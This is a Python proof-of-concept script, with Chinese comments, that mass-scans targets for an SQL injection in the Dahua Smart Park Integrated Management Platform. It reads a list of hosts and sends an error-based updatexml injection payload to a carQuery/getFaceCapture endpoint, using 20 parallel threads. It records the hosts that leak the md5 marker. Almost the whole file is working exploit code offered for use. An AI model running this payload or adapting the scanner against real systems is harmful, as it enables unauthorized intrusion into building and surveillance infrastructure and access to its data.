"""
大华智慧园区综合管理平台SQL注入poc
"""
import argparse, sys, requests
from multiprocessing.dummy import Pool
from rich.console import Console
import textwrap
from functools import partial
requests.packages.urllib3.disable_warnings()
console = Console()


text = """


 ██████╗███╗   ██╗██╗   ██╗██████╗       ██████╗  ██████╗ ██████╗  ██╗      ███████╗ ██╗██╗  ██╗ █████╗  ██████╗ 
██╔════╝████╗  ██║██║   ██║██╔══██╗      ╚════██╗██╔═████╗╚════██╗███║      ██╔════╝███║██║  ██║██╔══██╗██╔═████╗
██║     ██╔██╗ ██║██║   ██║██║  ██║█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗███████╗╚██║███████║╚██████║██║██╔██║
██║     ██║╚██╗██║╚██╗ ██╔╝██║  ██║╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚════██║ ██║╚════██║ ╚═══██║████╔╝██║
╚██████╗██║ ╚████║ ╚████╔╝ ██████╔╝      ███████╗╚██████╔╝███████╗ ██║      ███████║ ██║     ██║ █████╔╝╚██████╔╝
 ╚═════╝╚═╝  ╚═══╝  ╚═══╝  ╚═════╝       ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝      ╚══════╝ ╚═╝     ╚═╝ ╚════╝  ╚═════╝ 
                                                                                                                 
  
                                                                                                     @version:1.0.0
                                                                                                     @author:zt-byte        

    """
def current(text):
    console.print(f"[+]{text} 存在漏洞",style="bold green")

def ban(text):
    console.print(text,style="bold red")


def poc(url,outfile):
    url_new = url + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D"
    try:
        response = requests.get(url_new, verify=False, timeout=5)
        if "1e469dbcb9211897b5f5ebf866c66f3" in response.text:
            current(url)
            with open(f"{outfile}", 'a', encoding="utf-8") as f:
                f.write(url_new + "\n")
        else:
            print(url + "不存在漏洞")
    except:
        pass

def Read_File(infile):
    list = []
    with open(f"{infile}", "r", encoding="utf-8") as f:
        result = f.readlines()

        for ip in result:
            ip = ip.strip("\n")
            list.append(ip)
    return list

    

if __name__ == '__main__':
    ban(text)
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台SQL注入poc', formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:  python poc.py -f ip.txt -o result.txt'''))
    parser.add_argument("-f", "--file", dest="file", type=str, help="要查询的url文件，example:urls.txt")
    parser.add_argument("-o", "--output", dest="result", type=str, default="result.txt",
                        help="结果的保存位置 ,default=result.txt example: result.txt")
    args = parser.parse_args()

    url_list = Read_File("ip.txt")

    pool = Pool(20)  # 20自己指定的线程数

    partial_printNumber = partial(poc,outfile=args.result)
    pool.map(partial_printNumber, url_list)  # 调用进程池的map方法
    pool.close()  # 关闭进程池，禁止提交新的任务
    pool.join()
